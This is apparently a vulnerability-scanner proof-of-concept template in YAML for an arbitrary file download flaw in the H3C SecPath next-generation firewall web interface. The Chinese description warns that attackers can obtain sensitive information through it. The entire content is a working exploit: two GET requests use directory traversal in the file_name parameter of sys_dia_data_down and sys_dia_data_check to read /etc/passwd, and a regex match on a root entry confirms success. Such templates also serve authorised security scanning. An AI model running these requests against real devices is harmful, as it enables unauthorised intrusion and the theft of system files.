expression: r0() || r1()
id: h3c-secpath-firewall-file-read
info:
  author: YekkoY
  description: "H3C SecPath \u4E0B\u4E00\u4EE3\u9632\u706B\u5899 \u5B58\u5728\u529F\
    \u80FD\u70B9\u5BFC\u81F4\u4EFB\u610F\u6587\u4EF6\u4E0B\u8F7D\u6F0F\u6D1E\uFF0C\
    \u653B\u51FB\u8005\u901A\u8FC7\u6F0F\u6D1E\u53EF\u4EE5\u83B7\u53D6\u654F\u611F\
    \u4FE1\u606F\ntitle=\"Web user login\"\n"
  name: "H3C SecPath\u4E0B\u4E00\u4EE3\u9632\u706B\u5899 sys_dia_data_check \u4EFB\
    \u610F\u6587\u4EF6\u4E0B\u8F7D\u6F0F\u6D1E"
  severity: high
rules:
  r0:
    expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
    request:
      method: GET
      path: /webui/?g=sys_dia_data_down&file_name=../../../../../../../../../../../../etc/passwd
  r1:
    expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
    request:
      method: GET
      path: /webui/?g=sys_dia_data_check&file_name=../../etc/passwd
